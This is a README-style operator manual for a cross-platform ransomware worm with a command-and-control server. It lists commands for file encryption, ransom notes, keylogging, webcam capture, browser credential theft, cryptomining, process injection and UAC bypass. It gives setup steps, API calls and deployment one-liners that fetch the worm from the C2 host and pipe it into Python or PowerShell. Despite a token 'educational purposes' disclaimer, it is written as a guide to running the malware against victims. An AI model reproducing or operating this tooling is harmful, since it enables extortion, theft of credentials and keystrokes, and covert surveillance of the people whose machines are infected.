# Cross-Platform Ransomware Worm with C2 Server

> **Complete Command and Control System Documentation**

## Table of Contents

- Overview
- Features
- System Architecture
- Installation Guide
  - C2 Server Installation
  - Worm Deployment
- C2 Server Commands
  - Encryption Commands
  - Keylogger Commands
  - Webcam Commands
  - System Commands
  - Data Exfiltration Commands
  - Persistence Commands
  - Ransomware Commands
  - Miscellaneous Commands
- API Reference
- Troubleshooting
- Security Considerations
- Command Examples
- File Structure
- Update Process
- Support
- Disclaimer
- License
- Quick Reference Card

---

## Overview

This document describes a complete cross-platform Command and Control (C2) system consisting of:

- **C2 Server:** A web-based dashboard for controlling infected machines.
- **Worm Malware:** Cross-platform agent that executes commands on Windows, macOS, and Linux.

The described capabilities include:

- File encryption and decryption
- Keystroke logging
- Webcam access
- Screenshot capture
- Data exfiltration
- Cryptocurrency mining
- System command execution
- Process injection
- And more...

---

## Features

### Worm Features

- Cross-platform support (Windows, macOS, Linux)
- Anti-VM detection
- Persistence mechanisms
- Stealth features
- AES-256 file encryption
- Keylogging
- Webcam capture
- Data exfiltration
- Cryptocurrency mining
- Process injection
- Dead man's switch
- Checkpoint resume

### C2 Server Features

- Web dashboard
- WebSocket support
- Command templates
- Keylog viewer
- Host statistics
- Multi-host management
- REST API
- Secure login

---

## System Architecture

```text
+-------------------------------------------------------------+
|                      C2 SERVER                              |
|                   (Your Computer)                           |
|                                                             |
|  +---------------+  +---------------+  +----------------+   |
|  | Web Dashboard |  | WebSocket     |  | REST API      |   |
|  | (Port 5000)   |  | (Real-time)   |  | (HTTP)        |   |
|  +---------------+  +---------------+  +----------------+   |
|                                                             |
|  +-----------------------------------------------------+    |
|  |               SQLite Database                       |    |
|  | Hosts, Commands, Keylogs, Encrypted Files           |    |
|  +-----------------------------------------------------+    |
+-------------------------------------------------------------+
                         |
                  DNS/HTTP Beacons
                         |
        +----------------+----------------+----------------+
        |                |                |
+---------------+ +---------------+ +---------------+
| Windows Agent | | macOS Agent   | | Linux Agent   |
+---------------+ +---------------+ +---------------+
```

---

# Installation Guide

## C2 Server Installation

### Option 1 — Quick Install

```bash
# Install dependencies
pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# Run
python c2_server.py
```

### Windows

```powershell
python -m pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

python c2_server.py
```

### macOS

```bash
brew install python3 python-tk

pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

python3 c2_server.py
```

### Linux

```bash
sudo apt update
sudo apt install python3 python3-pip python3-tk -y

pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

python3 c2_server.py
```

---

## Initial Server Configuration

```text
============================================================
C2 SERVER v2.0
============================================================
Server URL: http://0.0.0.0:5000
Username: admin
Password: secure_password_123
============================================================
Waiting for connections...
============================================================
```

---

## Worm Deployment

### Configuration

```python
C2_SERVER = "your-ip-address-or-domain.com"
```

### Deployment Methods

```bash
python3 worm.py
```

```bash
curl -s http://your-c2-server/worm.py | python3
```

```powershell
powershell -command "Invoke-Expression (Invoke-WebRequest -Uri 'http://your-c2-server/worm.py').Content"
```

---

# C2 Server Commands

## Command Structure

```json
{
  "host_id": "target-host-id",
  "command": "command_name",
  "params": {
    "param1": "value1",
    "param2": "value2"
  }
}
```

---

## Encryption Commands

| Command | Description | Parameters |
|---------|-------------|------------|
| encrypt | Encrypt all files | password |
| encrypt_files | Encrypt specific files | file_paths, password |
| encrypt_directory | Encrypt directory | directory, password, recursive |
| decrypt | Decrypt all files | password |
| decrypt_files | Decrypt files | file_paths, password |
| decrypt_directory | Decrypt directory | directory, password, recursive |
| encryption_status | Status | None |
| encryption_stats | Statistics | None |

---

## Keylogger Commands

| Command | Description |
|---------|-------------|
| keylog_start | Start capture |
| keylog_stop | Stop capture |
| keylog_status | Status |
| keylog_download | Download logs |
| keylog_clear | Clear logs |

---

## Webcam Commands

| Command | Description |
|---------|-------------|
| webcam_capture | Capture frame |
| webcam_stream | Stream video |
| webcam_status | Status |
| webcam_release | Release device |

---

## System Commands

| Command | Description |
|---------|-------------|
| execute | Run command |
| screenshot | Capture screenshot |
| screen_share | Share screen |
| block_computer | Lock computer |
| list_processes | List processes |
| kill_process | Kill process |
| inject_process | Inject process |

---

## Data Exfiltration Commands

| Command | Description |
|---------|-------------|
| exfiltrate | Steal files |
| steal_browser | Browser credentials |
| download_file | Download remote file |
| upload_file | Upload file |
| collect_data | Collect information |
| file_search | Search files |
| directory_list | List directories |

---

## Persistence Commands

| Command | Description |
|---------|-------------|
| install_persistence | Install persistence |
| persistence_status | Status |

---

## Ransomware Commands

| Command | Description |
|---------|-------------|
| display_ransom_note | Show ransom note |
| change_ransom_amount | Update amount |
| change_payment_address | Update address |
| deadline | Set deadline |

---

## Mining Commands

| Command | Description |
|---------|-------------|
| start_mining | Start mining |
| stop_mining | Stop mining |
| mining_status | Status |

---

## Miscellaneous Commands

| Command | Description |
|---------|-------------|
| status | Status |
| heartbeat | Heartbeat |
| get_os_info | OS information |
| get_stats | Statistics |
| clear_logs | Clear logs |
| bypass_uac | Bypass UAC |
| check_environment | Check VM |
| self_destruct | Self destruct |

---

# API Reference

## REST Endpoints

| Endpoint | Method |
|----------|--------|
| `/api/hosts` | GET |
| `/api/host/<host_id>` | GET |
| `/api/command` | POST |
| `/api/beacon` | POST |
| `/api/command_result` | POST |
| `/api/keylogs/<host_id>` | GET |
| `/api/encrypted_files/<host_id>` | GET |
| `/api/stats` | GET |
| `/api/command_templates` | GET |
| `/api/clear_logs` | POST |

---

## API Examples

### Send Command

```bash
curl -X POST http://localhost:5000/api/command \
-H "Content-Type: application/json" \
-d '{
  "host_id":"host-uuid",
  "command":"execute",
  "params":{"command":"whoami"}
}'
```

### Get Keylogs

```bash
curl http://localhost:5000/api/keylogs/host-uuid
```

### Get Statistics

```bash
curl http://localhost:5000/api/stats
```

---

## WebSocket Events

| Event | Direction |
|--------|-----------|
| connect | Client → Server |
| disconnect | Client → Server |
| beacon | Server → Client |
| command_result | Server → Client |
| get_hosts | Client → Server |
| send_command | Client → Server |
| hosts | Server → Client |

---

# Troubleshooting

## Server Won't Start

```bash
# Windows
netstat -ano | findstr :5000

# Linux/macOS
lsof -i :5000
```

## Worm Not Connecting

```bash
curl http://your-server-ip:5000/api/hosts
```

## Keylogger

```bash
sudo usermod -a -G input $USER
```

## Webcam

```bash
pip install opencv-python opencv-python-headless

sudo apt-get install v4l-utils
```

---

# Security Considerations

### Change Password

```python
ADMIN_PASSWORD = "your-strong-password-here"
```

### HTTPS

```python
socketio.run(
    app,
    host="0.0.0.0",
    port=5000,
    ssl_context=("cert.pem","key.pem")
)
```

### Allowed IPs

```python
ALLOWED_IPS = [
    "192.168.1.100",
    "10.0.0.5"
]
```

### Domain

```python
C2_DOMAIN = "your-domain.com"
```

### Backup Database

```bash
cp c2_database.db c2_database_backup_$(date +%Y%m%d).db
```

---

# File Structure

```text
c2_server/
├── c2_server.py
├── c2_database.db
├── c2_server.log
└── requirements.txt

worm/
├── worm.py
├── worm_debug.log
└── ~/.system_update/
```

---

# Update Process

## Worm

1. Modify `worm.py`
2. Deploy update
3. Send `self_update`

## Server

```bash
cp c2_database.db c2_database_backup.db

python c2_server.py
```

---

# Support

## Logs

- `c2_server.log`
- `worm_debug.log`
- `c2_database.db`

### Debug

```bash
python3 worm.py --debug

tail -f c2_server.log
```

---

# Disclaimer

This software is for educational and security research purposes only.

- Do not use on systems without explicit authorization.
- The author is not responsible for misuse.
- Follow all applicable laws.

---

# License

Educational purposes only.

---

# Quick Reference

| Item | Location | Notes |
|------|----------|------|
| C2 Server | `http://localhost:5000` | Login required |
| Worm | Target machine | Auto-connects |
| Commands | Dashboard/API | JSON |
| Database | `c2_database.db` | SQLite |
| Logs | `c2_server.log` | Text |
